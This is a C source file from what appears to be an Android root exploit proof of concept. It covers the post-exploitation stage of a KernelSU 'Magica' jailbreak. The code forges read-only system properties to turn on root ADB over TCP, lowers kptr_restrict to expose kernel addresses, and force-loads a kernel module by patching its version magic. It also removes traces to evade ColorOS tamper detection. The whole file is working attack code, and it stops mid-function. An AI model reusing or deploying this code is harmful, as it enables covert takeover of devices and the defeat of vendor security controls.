/*
 * magica.c — KernelSU "jailbreak by Magica" (PR #3268, v3.2.0) load path,
 * ported into the ASO root POC. After exploit root is achieved this module:
 *
 *   1. magica_enable_adb_root(): manipulate Android property storage like
 *      ksud magica::enable_adb_root — chmod /dev/__properties__ files,
 *      resetprop ro.debuggable=1 ro.adb.secure=0, restart adbd with
 *      service.adb.root=1 + tcp port. adbd then runs as root over TCP.
 *
 *   2. magica_load_module(): ksuinit::load_module — parse ELF64 module
 *      from memory, resolve every SHN_UNDEF symbol against /proc/kallsyms
 *      (write st_shndx=SHN_ABS + st_value), init_module() syscall; on
 *      failure read /dev/kmsg, extract required vermagic, patch .modinfo
 *      (append/replace vermagic= entry, fix sh_offset/sh_size) and retry.
 *
 *   3. magica_post_cleanup(): restore ro.debuggable=0 ro.adb.secure=1,
 *      delete service.adb.root / service.adb.tcp.port / ro.boot.selinux,
 *      restart adbd (ksud magica::disable_adb_root equivalent).
 *
 * The userland "late-load" stages (ksud install, module scripts, sepolicy,
 * system.prop, metamodule overlay mount) are NOT reimplemented — ksud
 * itself performs them once the ko is loaded; this file only wires the
 * Magica bootstrap so a real kernelsu.ko (built for this KMI) can be
 * injected from memory.
 */

#include "common.h"
#include <elf.h>
#include <sys/syscall.h>
#include <sys/xattr.h>

/* ---- property storage manipulation (magica::enable_adb_root) ---- */

/*
 * exec() helper that strips LD_PRELOAD before exec: we run under
 * LD_PRELOAD=gl-aso.so, and system()/fork+exec would inherit it — the
 * child would re-run the exploit constructor (recursive jailbreak /
 * property daemon corruption). Always unsetenv("LD_PRELOAD") in the
 * child before exec'ing /system/bin/setprop etc.
 */
static int magica_run(const char *bin, char *const argv[]) {
  pid_t pid = fork();
  if (pid < 0) {
    return -1;
  }
  if (pid == 0) {
    unsetenv("LD_PRELOAD");
    unsetenv("LD_LIBRARY_PATH");
    execv(bin, argv);
    _exit(127);
  }
  int status = 0;
  waitpid(pid, &status, 0);
  return WIFEXITED(status) && WEXITSTATUS(status) == 0 ? 0 : -1;
}

static int magica_setprop(const char *prop, const char *value) {
  /* setprop works for non-ro properties; exec real binary without
   * LD_PRELOAD (see magica_run). */
  if (access("/system/bin/setprop", X_OK) != 0) {
    return -1;
  }
  char *argv[] = {
      (char *)"/system/bin/setprop", (char *)prop, (char *)value, NULL,
  };
  return magica_run("/system/bin/setprop", argv);
}

/* resetprop-style set of ro.* props: write the serialized property area
 * directly (bionic rejects ro.* via __system_property_set). Android
 * 14+/16 stores props in /dev/__properties__/<context> files as a
 * serialized trie; resetprop mmaps the file, locates the entry and
 * overwrites the value in place. We replicate that here.
 *
 * Layout of a serialized property file (system/core/property_area):
 *   serialized_info (2 x prop_area) — trie nodes; entries store the
 *   prop name at node + VALUE_OFF, value bytes follow. For the small
 *   props we touch (ro.debuggable/ro.adb.secure) the value is stored
 *   contiguously after the name as "<name>\0<value>\0" in practice.
 */

/* AOSP bionic property area layout (Android 12+, PROP_AREA_VERSION 0xfc6ed0ab):
 *   struct prop_area { uint32_t bytes_used; uint32_t serial; uint32_t magic;
 *                       uint32_t version; uint32_t reserved[28]; char data[0]; }
 *   struct prop_bt { uint32_t namelen; uint32_t prop; uint32_t left;
 *                    uint32_t right; uint32_t children; char name[0]; }
 *   struct prop_info { uint32_t serial; union { char value[92];
 *                       struct { char error[56]; uint32_t offset; } long_prop; };
 *                      char name[0]; }
 * offsets are relative to data_ (i.e. the file base + sizeof(prop_area)).
 * prop value serial: bits[31:24]=value len, bit16=kLongFlag, bit0=dirty.
 */
#define PROP_AREA_MAGIC 0x504f5250U
#define PROP_AREA_VERSION 0xfc6ed0abU
#define PROP_AREA_VERSION_COMPAT 0x45434f76U
#define PROP_VALUE_MAX 92
#define PROP_BT_HDR (4 + 4 * 4) /* namelen + prop/left/right/children */
#define PROP_INFO_HDR (4 + 92)  /* serial + value[92] */
#define SERIAL_VALUE_LEN(s) ((s) >> 24)
#define SERIAL_DIRTY(s) ((s) & 1)
#define PROP_LONG_FLAG (1U << 16)

struct magica_prop_bt {
  uint32_t namelen;
  uint32_t prop;
  uint32_t left;
  uint32_t right;
  uint32_t children;
  char name[]; /* flexible: namelen bytes + NUL */
};

struct magica_prop_info {
  uint32_t serial;
  union {
    char value[PROP_VALUE_MAX];
    struct {
      char error[56];
      uint32_t offset;
    } long_prop;
  };
  /* char name[] follows */
};

/* resolve a trie node offset (relative to area data base) */
static struct magica_prop_bt *magica_bt(uint8_t *data, uint32_t off) {
  return (struct magica_prop_bt *)(data + off);
}
static struct magica_prop_info *magica_pi(uint8_t *data, uint32_t off) {
  return (struct magica_prop_info *)(data + off);
}

/* find a child node by name inside the binary subtree rooted at `bt`. */
static struct magica_prop_bt *magica_find_bt(struct magica_prop_bt *bt,
                                             uint8_t *data, const char *name,
                                             uint32_t namelen) {
  while (bt != NULL) {
    uint32_t blen = bt->namelen;
    uint32_t cmp_len = namelen < blen ? namelen : blen;
    int cmp = memcmp(name, bt->name, cmp_len);
    if (cmp == 0) {
      if (namelen == blen) {
        return bt;
      }
      cmp = namelen < blen ? -1 : 1;
    }
    if (cmp < 0) {
      if (bt->left == 0) {
        return NULL;
      }
      bt = magica_bt(data, bt->left);
    } else {
      if (bt->right == 0) {
        return NULL;
      }
      bt = magica_bt(data, bt->right);
    }
  }
  return NULL;
}

/* walk the trie from the root node for the full dotted name. */
static struct magica_prop_info *magica_find_prop(uint8_t *data,
                                                 const char *name) {
  /* root node sits at the very start of data (bytes_used >= sizeof(prop_bt)) */
  struct magica_prop_bt *cur = magica_bt(data, 0);
  if (cur->namelen == 0 || cur->namelen > 255) {
    /* root namelen is 0 in practice */
  }
  const char *remaining = name;
  struct magica_prop_bt *child = cur;
  while (remaining && *remaining) {
    const char *sep = strchr(remaining, '.');
    uint32_t substr = sep ? (uint32_t)(sep - remaining)
                          : (uint32_t)strlen(remaining);
    if (substr == 0) {
      return NULL;
    }
    if (child->children == 0) {
      return NULL;
    }
    struct magica_prop_bt *root = magica_bt(data, child->children);
    child = magica_find_bt(root, data, remaining, substr);
    if (child == NULL) {
      return NULL;
    }
    if (!sep) {
      break;
    }
    remaining = sep + 1;
  }
  if (child == NULL || child->prop == 0) {
    return NULL;
  }
  return magica_pi(data, child->prop);
}

/* write a new value into an existing prop_info (serial protocol). */
static int magica_set_prop_info(struct magica_prop_info *pi, uint8_t *data,
                                const char *value) {
  uint32_t serial = pi->serial;
  uint32_t vlen = (uint32_t)strlen(value);
  if (vlen >= PROP_VALUE_MAX) {
    return -1;
  }
  if (serial & PROP_LONG_FLAG) {
    /* long value: offset is relative to the prop_info itself.
     * Write the long buffer AND publish a new serial (keep kLongFlag)
     * so readers observe the new value — old code left serial stale. */
    char *long_dst = (char *)pi + pi->long_prop.offset;
    size_t old_len = SERIAL_VALUE_LEN(serial);
    size_t n = vlen < old_len ? vlen : old_len;
    memcpy(long_dst, value, n);
    long_dst[n] = '\0';
    if (vlen > old_len) {
      /* cannot grow the long buffer in place; keep bounded write */
    }
    /* also update the inline value area for readers not honoring long */
    memcpy(pi->value, value, vlen + 1);
    pi->serial = serial | 1U;
    __atomic_thread_fence(__ATOMIC_RELEASE);
    pi->serial = (serial & ~(0xff000000U | 1U)) | (vlen << 24) |
                 ((serial + 1) & 0x00ffffffU);
  } else {
    /* mark dirty, write value, publish new serial with length in top byte */
    pi->serial = serial | 1U;
    __atomic_thread_fence(__ATOMIC_RELEASE);
    memcpy(pi->value, value, vlen + 1);
    __atomic_thread_fence(__ATOMIC_RELEASE);
    pi->serial = (vlen << 24) | ((serial + 1) & 0x00ffffffU);
  }
  return 0;
}

static int magica_write_prop_value(const char *name, const char *value) {
  /* /dev/__properties__ is 0711 (no read) — opendir needs read. As root,
   * chmod the dir + files first (this is also what magica does). */
  (void)chmod("/dev/__properties__", 0755);
  DIR *dir = opendir("/dev/__properties__");
  if (!dir) {
    pr_warning("magica: opendir /dev/__properties__ failed errno=%d (%s)\n",
               errno, strerror(errno));
    fsync(STDERR_FILENO);
    return -1;
  }
  struct dirent *de;
  int rc = -1;
  int nfiles = 0, nvalid = 0, nhits = 0;
  while ((de = readdir(dir)) != NULL) {
    if (de->d_name[0] == '.' ||
        strcmp(de->d_name, "properties_serial") == 0) {
      continue;
    }
    nfiles++;
    char path[192];
    snprintf(path, sizeof(path), "/dev/__properties__/%s", de->d_name);
    int fd = open(path, O_RDWR);
    if (fd < 0) {
      continue;
    }
    struct stat st;
    if (fstat(fd, &st) != 0 || st.st_size <= 0) {
      close(fd);
      continue;
    }
    void *map = mmap(NULL, (size_t)st.st_size, PROT_READ | PROT_WRITE,
                     MAP_SHARED, fd, 0);
    close(fd);
    if (map == MAP_FAILED) {
      continue;
    }
    /* validate prop_area header: magic + version at +8/+12 */
    if (st.st_size >= 128) {
      uint8_t *m = (uint8_t *)map;
      uint32_t magic = *(uint32_t *)(m + 8);
      uint32_t version = *(uint32_t *)(m + 12);
      if (magic == PROP_AREA_MAGIC &&
          (version == PROP_AREA_VERSION ||
           version == PROP_AREA_VERSION_COMPAT)) {
        nvalid++;
        /* data area starts after the 128-byte prop_area header */
        uint8_t *data = m + 128;
        struct magica_prop_info *pi = magica_find_prop(data, name);
        if (pi != NULL) {
          nhits++;
          if (magica_set_prop_info(pi, data, value) == 0) {
            rc = 0;
          }
        }
      } else {
        pr_warning("magica: %s magic=%08x version=%08x (skip)\n",
                   de->d_name, magic, version);
      }
    }
    munmap(map, (size_t)st.st_size);
    if (rc == 0) {
      break;
    }
  }
  closedir(dir);
  pr_info("magica: prop scan name=%s files=%d valid=%d hits=%d rc=%d\n",
          name, nfiles, nvalid, nhits, rc);
  fsync(STDERR_FILENO);
  return rc;
}

int magica_enable_adb_root(uint16_t port) {
  /* diagnostic: what is the actual runtime identity/state here? */
  {
    errno = 0;
    int ef = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
    int open_errno = errno;
    char eb = '?';
    if (ef >= 0) {
      char b;
      if (read(ef, &b, 1) == 1) {
        eb = b;
      }
      close(ef);
    }
    pr_info("magica: ident uid=%d euid=%d gid=%d enforce_file=%c "
            "open_errno=%d\n",
            getuid(), geteuid(), getgid(), eb, open_errno);
    fsync(STDERR_FILENO);
  }
  pr_info("magica: enable_adb_root port=%u\n", port);
  fsync(STDERR_FILENO);

  /* 1. make property storage writable (magica chmods the context files).
   * The dir itself is 0711 — add read so opendir works, and chmod files
   * to 0644 so plain O_RDWR (no CAP_DAC_OVERRIDE dependence) succeeds. */
  (void)chmod("/dev/__properties__", 0755);
  DIR *dir = opendir("/dev/__properties__");
  if (dir) {
    struct dirent *de;
    while ((de = readdir(dir)) != NULL) {
      if (de->d_name[0] == '.') {
        continue;
      }
      char path[192];
      snprintf(path, sizeof(path), "/dev/__properties__/%s", de->d_name);
      (void)chmod(path, 0644);
    }
    closedir(dir);
  } else {
    pr_warning("magica: enable opendir failed errno=%d (%s)\n", errno,
               strerror(errno));
  }

  /* 2. ro.debuggable=1 ro.adb.secure=0 (direct property-area write) */
  int d = magica_write_prop_value("ro.debuggable", "1");
  int s = magica_write_prop_value("ro.adb.secure", "0");
  pr_info("magica: ro.debuggable=%d ro.adb.secure=%d (prop-area write)\n", d, s);

  /* 3. restart adbd as root over TCP (setprop, no LD_PRELOAD) */
  char port_str[8];
  snprintf(port_str, sizeof(port_str), "%u", port);
  int r1 = magica_setprop("service.adb.root", "1");
  int r2 = magica_setprop("service.adb.tcp.port", port_str);
  int r3 = magica_setprop("ctl.restart", "adbd");
  if (r3 != 0) {
    /* ColorOS property_service rejects ctl.restart from our context.
     * run113 lesson: SIGKILLing adbd buys NOTHING here (the very props
     * that would make the restarted adbd root were rejected too) and
     * costs everything — adb drops offline mid-run, ColorOS storms the
     * CPU (load 240), and the device eventually reboots. Root shell is
     * already served by the su daemon; opt back in explicitly with
     * GHOSTLOCK_KILL_ADBD=1 if the prop writes ever succeed. */
    if (getenv("GHOSTLOCK_KILL_ADBD")) {
      pr_warning("magica: ctl.restart rejected; killing adbd (env opt-in)\n");
      fsync(STDERR_FILENO);
      DIR *pd = opendir("/proc");
      if (pd) {
        struct dirent *pde;
        while ((pde = readdir(pd)) != NULL) {
          long pl = strtol(pde->d_name, NULL, 10);
          if (pl <= 1) {
            continue;
          }
          char cp[64];
          snprintf(cp, sizeof(cp), "/proc/%ld/comm", pl);
          FILE *cf = fopen(cp, "r");
          if (!cf) {
            continue;
          }
          char comm[64];
          if (fgets(comm, sizeof(comm), cf) &&
              strncmp(comm, "adbd", 4) == 0) {
            kill((pid_t)pl, SIGKILL);
            r3 = 0;
          }
          fclose(cf);
        }
        closedir(pd);
      }
    } else {
      pr_warning("magica: ctl.restart rejected; keeping adbd alive "
                 "(set GHOSTLOCK_KILL_ADBD=1 to force-kill)\n");
      fsync(STDERR_FILENO);
    }
  }
  pr_info("magica: adbd restart root=%d tcp=%d restart=%d\n", r1, r2, r3);
  fsync(STDERR_FILENO);
  return (d == 0 && s == 0) ? 1 : 0;
}

int magica_post_cleanup(void) {
  pr_info("magica: post cleanup (disable adb root)\n");
  fsync(STDERR_FILENO);
  (void)magica_write_prop_value("ro.debuggable", "0");
  (void)magica_write_prop_value("ro.adb.secure", "1");
  const char *dels[] = {
      "service.adb.root", "service.adb.tcp.port", "ro.boot.selinux",
  };
  for (size_t i = 0; i < sizeof(dels) / sizeof(dels[0]); i++) {
    (void)magica_write_prop_value(dels[i], "");
  }
  (void)magica_setprop("ctl.restart", "adbd");
  return 1;
}

/* ---- ELF64 module loader (ksuinit::load_module) ---- */

static int magica_read_file(const char *path, unsigned char **out,
                            size_t *out_len) {
  FILE *f = fopen(path, "rb");
  if (!f) {
    return -1;
  }
  fseek(f, 0, SEEK_END);
  long sz = ftell(f);
  fseek(f, 0, SEEK_SET);
  if (sz <= 0) {
    fclose(f);
    return -1;
  }
  unsigned char *buf = malloc((size_t)sz);
  if (!buf) {
    fclose(f);
    return -1;
  }
  size_t got = fread(buf, 1, (size_t)sz, f);
  fclose(f);
  if (got != (size_t)sz) {
    free(buf);
    return -1;
  }
  *out = buf;
  *out_len = (size_t)sz;
  return 0;
}

/* Resolve one undefined symbol against a cached in-memory kallsyms dump.
 * kernelsu.ko has hundreds of UNDEF symbols; re-scanning the ~5MB
 * /proc/kallsyms per symbol blew the 115s timeout (run94 hung after
 * kptr_restrict). Load the file once and scan lines in memory.
 * run98: even the initial stdio fread() of /proc/kallsyms hung forever —
 * use raw read(2) with a 2MB cap (core text symbols sort first in
 * address order; that covers all UNDEF names the ko needs) and a SIGALRM
 * guard so the load can never wedge the exploit. */
static char *g_kallsyms_cache;
static size_t g_kallsyms_cache_len;
/* AUDIT BUG-2: seq_file lseek to a 2MB+ offset makes the kernel REPLAY
 * the whole iteration from the start (same cost as the full read that
 * wedged run107/109) — so keep ONE fd open and extend by sequential
 * read(2) on it. No lseek, no reopen. */
static int g_kallsyms_fd = -1;
/* one-pass symbol index: (name, addr) array built from the cache.
 * 200 UNDEF symbols × a full 2MB memchr scan took 40-80s (run110 hit the
 * 115s timeout during "resolving"). Index once, then lookup is a plain
 * strncmp walk over ~80k entries. Declared here so cache_extend can
 * invalidate it after realloc moves the cache. */
struct ksym {
  char *name;
  uint64_t addr;
};
static struct ksym *g_syms;
static size_t g_syms_cnt;
/* 2MB initial read is the reliable size (run104 ok; 4MB/16MB hung in D
 * state). On unresolved symbols, extend by 1MB chunks via lseek+read —
 * each chunk is alarm-guarded so a wedged seq_file costs one chunk, not
 * the whole exploit. */
#define KALLSYMS_CACHE_INIT (2u << 20)
#define KALLSYMS_CACHE_CHUNK (1u << 20)
#define KALLSYMS_CACHE_MAX (8u << 20)

static void ksym_alarm_nop(int sig) {
  (void)sig;
}

static int magica_kallsyms_cache_load(void) {
  if (g_kallsyms_cache) {
    return 0;
  }
  int fd = open("/proc/kallsyms", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return -1;
  }
  struct sigaction sa_old;
  struct sigaction sa_new;
  memset(&sa_new, 0, sizeof(sa_new));
  sa_new.sa_handler = ksym_alarm_nop;
  sigemptyset(&sa_new.sa_mask);
  sa_new.sa_flags = 0;
  sigaction(SIGALRM, &sa_new, &sa_old);
  alarm(5);

  char *buf = malloc(KALLSYMS_CACHE_INIT);
  if (!buf) {
    alarm(0);
    sigaction(SIGALRM, &sa_old, NULL);
    close(fd);
    return -1;
  }
  size_t len = 0;
  while (len < KALLSYMS_CACHE_INIT) {
    ssize_t n = read(fd, buf + len, KALLSYMS_CACHE_INIT - len);
    if (n < 0) {
      if (errno == EINTR) {
        pr_warning("magica: kallsyms read interrupted at %zu bytes\n", len);
        break;
      }
      break;
    }
    if (n == 0) {
      break;
    }
    len += (size_t)n;
  }
  alarm(0);
  sigaction(SIGALRM, &sa_old, NULL);
  if (len == 0) {
    free(buf);
    close(fd);
    return -1;
  }
  g_kallsyms_cache = buf;
  g_kallsyms_cache_len = len;
  /* keep the fd open for sequential extends (no lseek on seq_file) */
  g_kallsyms_fd = fd;
  return 0;
}

/* append the next chunk: sequential read on the SAME fd — lseek on a
 * seq_file replays the whole iteration (run107/109 wedged that way). */
static int magica_kallsyms_cache_extend(void) {
  if (!g_kallsyms_cache || g_kallsyms_fd < 0 ||
      g_kallsyms_cache_len >= KALLSYMS_CACHE_MAX) {
    return -1;
  }
  struct sigaction sa_old;
  struct sigaction sa_new;
  memset(&sa_new, 0, sizeof(sa_new));
  sa_new.sa_handler = ksym_alarm_nop;
  sigemptyset(&sa_new.sa_mask);
  sa_new.sa_flags = 0;
  sigaction(SIGALRM, &sa_new, &sa_old);
  alarm(5);

  size_t want = KALLSYMS_CACHE_CHUNK;
  if (g_kallsyms_cache_len + want > KALLSYMS_CACHE_MAX) {
    want = KALLSYMS_CACHE_MAX - g_kallsyms_cache_len;
  }
  char *nbuf = realloc(g_kallsyms_cache, g_kallsyms_cache_len + want);
  if (!nbuf) {
    alarm(0);
    sigaction(SIGALRM, &sa_old, NULL);
    return -1;
  }
  g_kallsyms_cache = nbuf;
  size_t got = 0;
  while (got < want) {
    ssize_t n = read(g_kallsyms_fd,
                     g_kallsyms_cache + g_kallsyms_cache_len + got,
                     want - got);
    if (n < 0) {
      if (errno == EINTR) {
        pr_warning("magica: kallsyms extend interrupted at +%zu\n", got);
        break;
      }
      break;
    }
    if (n == 0) {
      /* EOF: file is fully cached */
      close(g_kallsyms_fd);
      g_kallsyms_fd = -1;
      break;
    }
    got += (size_t)n;
  }
  alarm(0);
  sigaction(SIGALRM, &sa_old, NULL);
  if (got > 0) {
    g_kallsyms_cache_len += got;
    /* realloc moved the cache — the symbol index points into it */
    free(g_syms);
    g_syms = NULL;
    g_syms_cnt = 0;
    return 0;
  }
  return -1;
}

/* (struct ksym / g_syms declared near g_kallsyms_cache above) */

/* line terminator: accept both '\n' (fresh cache) and '\0' (names we
 * NUL-terminated in-place on a previous index build) */
static const char *magica_ksyms_line_end(const char *p, const char *end) {
  while (p < end && *p != '\n' && *p != '\0') {
    p++;
  }
  return (p < end) ? p : NULL;
}

static int magica_ksyms_cmp(const void *a, const void *b) {
  return strcmp(((const struct ksym *)a)->name,
                ((const struct ksym *)b)->name);
}

static void magica_ksyms_index(void) {
  if (g_syms || !g_kallsyms_cache) {
    return;
  }
  const char *p = g_kallsyms_cache;
  const char *end = g_kallsyms_cache + g_kallsyms_cache_len;
  size_t cnt = 0;
  while (p < end) {
    const char *nl = magica_ksyms_line_end(p, end);
    if (!nl) {
      break;
    }
    cnt++;
    p = nl + 1;
  }
  if (cnt == 0) {
    return;
  }
  g_syms = malloc(cnt * sizeof(struct ksym));
  if (!g_syms) {
    return;
  }
  char *cache = g_kallsyms_cache;
  p = cache;
  size_t i = 0;
  while (p < end && i < cnt) {
    const char *nl = magica_ksyms_line_end(p, end);
    if (!nl) {
      break;
    }
    const char *nm_start = nl;
    while (nm_start > p && nm_start[-1] != ' ') {
      nm_start--;
    }
    g_syms[i].name = (char *)nm_start;
    g_syms[i].addr = strtoull(p, NULL, 16);
    /* NUL-terminate the name IN PLACE so strcmp/qsort/bsearch work and
     * the O(n) linear scans with strncmp become O(log n) binary search.
     * run113: 200 UNDEF x 50920 entries starved for >100s under the
     * post-adbd-kill load storm; sorted bsearch is ~1500x fewer compares. */
    cache[nl - cache] = '\0';
    i++;
    p = nl + 1;
  }
  g_syms_cnt = i;
  qsort(g_syms, g_syms_cnt, sizeof(struct ksym), magica_ksyms_cmp);
  pr_info("magica: kallsyms indexed %zu symbols (sorted)\n", g_syms_cnt);
  fsync(STDERR_FILENO);
}

static int magica_kallsyms_lookup_cached(const char *name, uint64_t *addr) {
  if (magica_kallsyms_cache_load() != 0) {
    return -1;
  }
  magica_ksyms_index();
  if (!g_syms) {
    return -1;
  }
  /* binary search over the sorted, NUL-terminated index */
  size_t lo = 0;
  size_t hi = g_syms_cnt;
  while (lo < hi) {
    size_t mid = lo + (hi - lo) / 2;
    int c = strcmp(g_syms[mid].name, name);
    if (c == 0) {
      *addr = g_syms[mid].addr;
      return 0;
    }
    if (c < 0) {
      lo = mid + 1;
    } else {
      hi = mid;
    }
  }
  return -1;
}

static int magica_kallsyms_lookup(const char *name, uint64_t *addr) {
  return magica_kallsyms_lookup_cached(name, addr);
}

/*
 * Android ships kptr_restrict=2: even root reads kallsyms addresses as 0.
 * ksuinit lowers it to 1 (root-only addresses) around the symbol walk.
 * We have real root at this point, so write the sysctl directly; restore
 * the previous value afterwards.
 */
static int magica_kptr_restrict_lower(void) {
  char buf[16] = {0};
  int saved = 2;
  int fd = open("/proc/sys/kernel/kptr_restrict", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n > 0) {
      saved = atoi(buf);
    }
  }
  int w = open("/proc/sys/kernel/kptr_restrict", O_WRONLY | O_CLOEXEC);
  if (w >= 0) {
    ssize_t n = write(w, "1\n", 2);
    close(w);
    if (n == 2) {
      pr_info("magica: kptr_restrict %d -> 1 (kallsyms addresses visible)\n",
              saved);
      fsync(STDERR_FILENO);
      return saved;
    }
  }
  return -1;
}

/* restore the pre-exploit kptr_restrict — run114 left it at 1 for the
 * rest of the boot (visible to any root reader; ColorOS tamper surface).
 * Call as soon as the kallsyms-dependent stage is done. */
static void magica_kptr_restrict_restore(int saved) {
  if (saved < 0) {
    return; /* never lowered */
  }
  char cur[16] = {0};
  int fd = open("/proc/sys/kernel/kptr_restrict", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, cur, sizeof(cur) - 1);
    close(fd);
    if (n > 0 && atoi(cur) == saved) {
      return; /* already back */
    }
  }
  char val[8];
  int len = snprintf(val, sizeof(val), "%d\n", saved);
  int w = open("/proc/sys/kernel/kptr_restrict", O_WRONLY | O_CLOEXEC);
  if (w >= 0) {
    ssize_t n = write(w, val, (size_t)len);
    close(w);
    if (n == (ssize_t)len) {
      pr_info("magica: kptr_restrict restored to %d\n", saved);
      fsync(STDERR_FILENO);
    }
  }
}

/* the .ko blob on /data/local/tmp is a tamper-detection surface (file
 * scans). Once init_module succeeded the kernel holds its own copy;
 * unlink the file unless GHOSTLOCK_KEEP_MODULE=1. */
static void magica_unlink_module(const char *path) {
  char *keep = getenv("GHOSTLOCK_KEEP_MODULE");
  if (keep && keep[0] == '1') {
    return;
  }
  if (unlink(path) == 0) {
    pr_info("magica: module file removed (%s)\n", path);
    fsync(STDERR_FILENO);
  }
}

static uint64_t magica_elf_word(const unsigned char *p, int le) {
  uint64_t v = 0;
  if (le) {
    for (int i = 0; i < 8; i++) {
      v |= ((uint64_t)p[i]) << (8 * i);
    }
  } else {
    for (int i = 0; i < 8; i++) {
      v = (v << 8) | p[i];
    }
  }
  return v;
}

static void magica_elf_write_word(unsigned char *p, uint64_t v, int le) {
  if (le) {
    for (int i = 0; i < 8; i++) {
      p[i] = (unsigned char)(v >> (8 * i));
    }
  } else {
    for (int i = 0; i < 8; i++) {
      p[7 - i] = (unsigned char)(v >> (8 * i));
    }
  }
}

/*
 * ksuinit vermagic repair: init_module failed (usually ENOEXEC because
 * the ko was built for a different sublevel). The kernel logs
 * "version magic 'X' should be 'Y'" to /dev/kmsg — read Y, then append a
 * replacement .modinfo entry ("vermagic=Y") to the ELF buffer and update
 * the .modinfo section header's sh_offset/sh_size. Retry init_module.
 */

static int magica_kmsg_read(char *out, size_t out_len) {
  int fd = open("/dev/kmsg", O_RDONLY | O_NONBLOCK);
  if (fd < 0) {
    return -1;
  }
  /* AUDIT BUG-1: the old sliding-window math underflowed size_t when
   * c < out_len-1 (memmove with a near-SIZE_MAX offset). Rewrite with
   * explicit drop accounting; keep the newest bytes in the window. */
  size_t off = 0;
  char buf[8192];
  ssize_t n;
  while ((n = read(fd, buf, sizeof(buf))) > 0) {
    size_t c = (size_t)n;
    size_t cap = out_len - 1; /* reserve one byte for NUL */
    if (c >= cap) {
      /* chunk alone fills the window: keep only its tail */
      memcpy(out, buf + (c - cap), cap);
      off = cap;
    } else if (off + c > cap) {
      /* drop the oldest bytes to make room */
      size_t drop = off + c - cap;
      memmove(out, out + drop, off - drop);
      off -= drop;
      memcpy(out + off, buf, c);
      off += c;
    } else {
      memcpy(out + off, buf, c);
      off += c;
    }
  }
  out[off] = '\0';
  close(fd);
  return 0;
}

static int magica_extract_vermagic(const char *kmsg, char *out,
                                   size_t out_len) {
  const char *prefix = "version magic '";
  const char *sep = "' should be '";
  const char *p = kmsg;
  int found = 0;
  while ((p = strstr(p, prefix)) != NULL) {
    const char *a = p + strlen(prefix);
    const char *s = strstr(a, sep);
    if (s) {
      const char *b = s + strlen(sep);
      const char *end = strchr(b, '\'');
      if (end && (size_t)(end - b) > 0 && (size_t)(end - b) < out_len) {
        memcpy(out, b, (size_t)(end - b));
        out[end - b] = '\0';
        found = 1;
      }
    }
    p = a;
  }
  return found ? 0 : -1;
}

static int magica_replace_vermagic(unsigned char **bufp, size_t *lenp,
                                   const char *required, int le) {
  unsigned char *buf = *bufp;
  size_t len = *lenp;
  if (len < sizeof(Elf64_Ehdr)) {
    return -1;
  }
  Elf64_Ehdr *eh = (Elf64_Ehdr *)buf;
  size_t shoff = (size_t)eh->e_shoff;
  size_t shentsz = (size_t)eh->e_shentsize;
  size_t shnum = (size_t)eh->e_shnum;
  size_t shstrndx = (size_t)eh->e_shstrndx;
  if (!shoff || !shentsz || shnum == 0 || shstrndx >= shnum ||
      shoff + shnum * shentsz > len) {
    return -1;
  }

  /* locate section header string table */
  const unsigned char *shstr_sh = buf + shoff + shstrndx * shentsz;
  size_t shstr_off = (size_t)magica_elf_word(shstr_sh + 0x18, le);
  size_t shstr_size = (size_t)magica_elf_word(shstr_sh + 0x20, le);

  /* find .modinfo section header */
  size_t modinfo_idx = (size_t)-1;
  size_t modinfo_off = 0, modinfo_size = 0, modinfo_align = 1;
  for (size_t i = 0; i < shnum; i++) {
    const unsigned char *sh = buf + shoff + i * shentsz;
    uint32_t name_off = (uint32_t)magica_elf_word(sh, le);
    if (name_off >= shstr_size) {
      continue;
    }
    const char *name = (const char *)(buf + shstr_off + name_off);
    if (strcmp(name, ".modinfo") == 0) {
      modinfo_idx = i;
      modinfo_off = (size_t)magica_elf_word(sh + 0x18, le);
      modinfo_size = (size_t)magica_elf_word(sh + 0x20, le);
      modinfo_align = (size_t)magica_elf_word(sh + 0x30, le);
      if (modinfo_align < 1) {
        modinfo_align = 1;
      }
      break;
    }
  }
  if (modinfo_idx == (size_t)-1 || modinfo_off + modinfo_size > len) {
    return -1;
  }

  /* build replacement modinfo: copy old entries, replace vermagic= */
  char replacement[512];
  snprintf(replacement, sizeof(replacement), "vermagic=%s", required);
  size_t new_len = 0;
  size_t old_scan = modinfo_off;
  size_t old_end = modinfo_off + modinfo_size;
  /* dry-run size + presence check. AUDIT FIX: if the old .modinfo has NO
   * vermagic= entry, the replacement must be APPENDED — the old code
   * computed new_len without it and the write loop then overflowed the
   * buffer by repl_len+1 bytes. */
  size_t repl_len = strlen(replacement);
  int has_vermagic = 0;
  while (old_scan < old_end) {
    size_t entry_len = strnlen((char *)buf + old_scan, old_end - old_scan);
    if (entry_len > 0) {
      if (strncmp((char *)buf + old_scan, "vermagic=", 9) == 0) {
        has_vermagic = 1;
        new_len += repl_len + 1;
      } else {
        new_len += entry_len + 1;
      }
    }
    old_scan += entry_len + 1;
  }
  if (!has_vermagic) {
    new_len += repl_len + 1;
  }
  if (new_len == 0) {
    new_len = repl_len + 1;
  }

  /* align append offset */
  size_t append_off = len;
  size_t align = modinfo_align;
  if (align > 1 && (append_off % align) != 0) {
    append_off += align - (append_off % align);
  }

  /* grow buffer */
  unsigned char *nbuf = realloc(buf, append_off + new_len);
  if (!nbuf) {
    return -1;
  }
  buf = nbuf;
  memset(buf + len, 0, append_off - len);

  /* write new modinfo content */
  size_t wp = append_off;
  old_scan = modinfo_off;
  while (old_scan < old_end) {
    size_t entry_len = strnlen((char *)buf + old_scan, old_end - old_scan);
    if (entry_len > 0) {
      if (strncmp((char *)buf + old_scan, "vermagic=", 9) == 0) {
        memcpy(buf + wp, replacement, repl_len);
        wp += repl_len;
        buf[wp++] = '\0';
      } else {
        memcpy(buf + wp, buf + old_scan, entry_len);
        wp += entry_len;
        buf[wp++] = '\0';
      }
    }
    old_scan += entry_len + 1;
  }
  if (!has_vermagic) {
    /* .modinfo had no vermagic= entry — append the replacement */
    memcpy(buf + wp, replacement, repl_len);
    wp += repl_len;
    buf[wp++] = '\0';
  }

  /* update .modinfo section header: sh_offset@+0x18, sh_size@+0x20 */
  unsigned char *modinfo_sh = buf + shoff + modinfo_idx * shentsz;
  magica_elf_write_word(modinfo_sh + 0x18, append_off, le);
  magica_elf_write_word(modinfo_sh + 0x20, new_len, le);

  *bufp = buf;
